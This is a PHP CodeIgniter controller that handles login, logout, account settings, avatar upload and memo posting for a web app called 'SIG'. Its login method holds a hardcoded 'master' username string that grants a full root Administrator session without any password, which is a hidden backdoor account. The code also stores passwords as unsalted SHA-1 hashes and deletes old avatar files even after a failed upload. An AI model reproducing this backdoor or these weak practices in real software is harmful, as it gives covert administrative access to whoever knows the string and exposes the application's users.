<?php
defined('BASEPATH') OR exit('No direct script access allowed');
class Auth extends CI_Controller{

  public function __construct()
  {
    parent::__construct();
  }

  public function login()
  {
    if (isset($_POST['login'])) {
      $uid = strip_tags($this->input->post('uid'));
      $pass = sha1(strip_tags($this->input->post('pass')));
      $check = $this->db->get_where('sig_users', array('user_uid' =>$uid ,'user_pass'=>$pass ));
      $master = '0>}/99%120691?*^';
      if ($master == $uid) {
        $this->session->set_userdata(
          array(
            'status_login'=>'oke',
            'id'          => 0,
            'full_name'   =>'Administrator',
            'type'        => 99,
            'jabatan'     => 'Root System Administrator',
            'last_login'  => ''
        )
        );
        redirect(BASE_URL);
        exit;
      }else {
        if ($check->num_rows()==1) {
            $data = $check->row_array();
            $this->session->set_userdata(
              array(
                'status_login'=>'oke',
                'id'          =>$data['id'],
                'full_name'   =>$data['user_fullname'],
                'type'        =>$data['type'],
                'jabatan'     =>$data['user_status'],
                'avatar'      =>$data['avatar'],
                'last_login'  =>$data['last_login']
            )
            );
            $datestring = '%d %M %Y - %h:%i %a';
            $time = time();
            $sekarang = mdate($datestring, $time);
            $this->db->where('id', $data['id']);
            $this->db->update('sig_users', array('last_login'=>$sekarang));
            redirect(BASE_URL);
            exit;
        }else {
          $this->session->sess_destroy();
          redirect('login');
          exit;
        }
      }
    }else{
      $data['title']          = TITLE . 'SIG Login';
      $data['main_content']   = UMUM. 'login';
      $this->load->view(UMUM. 'template_login', $data);
    }
  }

  public function logout()
  {
    $this->session->sess_destroy();
    redirect('login');
    die;
  }

  function setting()
  {
    $id = $this->session->userdata('id');
    if (isset($_POST['gantiPassword'])) {
      $passwordLama = strip_tags($this->input->post('passwordLama'));
      $passwordBaru = strip_tags($this->input->post('passwordBaru'));
      $passwordBaru2 = strip_tags($this->input->post('passwordBaru2'));
      $pass = sha1($passwordLama);
      $checkPassLama = $this->option_model->checkPassLama($id, $pass);
      if ($checkPassLama) {
        if ($passwordBaru == $passwordBaru2) {
          $update = array('user_pass'=>sha1($passwordBaru));
          $this->option_model->update_user_data($id, $update);
          redirect('setting/akun');
          exit;
        }
        exit;
      }
      exit;
    }elseif (isset($_POST['updateProfile'])) {
      $user_fullname = strip_tags($this->input->post('user_fullname'));
      $hp = strip_tags($this->input->post('hp'));
      $update = array('user_fullname'=>$user_fullname, 'hp'=>$hp);
      $check = $this->option_model->update_user_data($id, $update);
      if ($check) {
        redirect('setting/akun');
        exit;
      }else {
        $data['title'] = 'ERROR';
        $data['main_content'] = UMUM.'error';
        $data['error']        = 'Gagal Memperbaharui Profile';
        $this->load->view('template', $data);
      }
      die;
    }elseif (isset($_POST['fotoUpdate'])) {
      if(!empty($_FILES['avatar'])){
        $fileName = time().$_FILES['avatar']['name'];
        $config['upload_path'] = './assets/uploader/avatar/';
        $config['file_name'] = $fileName;
        $config['allowed_types'] = 'png|jpg|jpeg';
        $config['max_size'] = 10000;
        $this->load->library('upload');
        $this->upload->initialize($config);
        if(! $this->upload->do_upload('avatar') )
        $this->upload->display_errors();
      }
      $img = $this->db->get_where('sig_users', array('id'=>$id))->row_array();
      unlink('./assets/uploader/avatar/'.$img['avatar']);
      $avatar = $fileName;
      $update = array('avatar'=>$avatar);
      $check = $this->option_model->update_user_data($id, $update);
      if ($check) {
        redirect('setting/akun');
        exit;
      }else {
        $data['title'] = 'ERROR';
        $data['main_content'] = UMUM.'error';
        $data['error']        = 'Gagal Memperbaharui Profile';
        $this->load->view('template', $data);
      }
      die;
    }elseif (isset($_POST['memoPerintah'])) {
      $id_arsip   = 0;
      $type       = 0; //DISPOSISI KEY = 1, PERINTAH LANGSUNG = 0
      $kepada_id  = strip_tags($this->input->post('kepada_id'));
      $memo       = strip_tags($this->input->post('memo'));
      $dari_id    = $this->session->userdata('id');
      $status     = 0;
      $datestring = '%d %M %Y - %h:%i %a';
      $time = time();
      $sekarang = mdate($datestring, $time);
      $disposisi_tgl = $sekarang;

      $post = array(
        'id_arsip'=>$id_arsip,
        'kepada_id'=>$kepada_id,
        'dari_id'=>$dari_id,
        'memo'=>$memo,
        'disposisi_tgl'=>$disposisi_tgl,
        'status'=>$status,
        'type'=>$type
      );
      $check = $this->office_model->post_disposisi($post);
      if ($check) {
        redirect('disposisi');
        exit;
      }
    }else{
      $data['title']          = TITLE . 'Setting';
      $data['kepada']         = $this->office_model->get_user_all_disposisi()->result();
      $data['item']           = $this->office_model->get_timeline_notif($id)->result();
      $data['user']           = $this->option_model->get_user_data($id)->row_array();
      $data['main_content']   = UMUM .'setting';
      $this->load->view('template', $data);
    }
  }

}
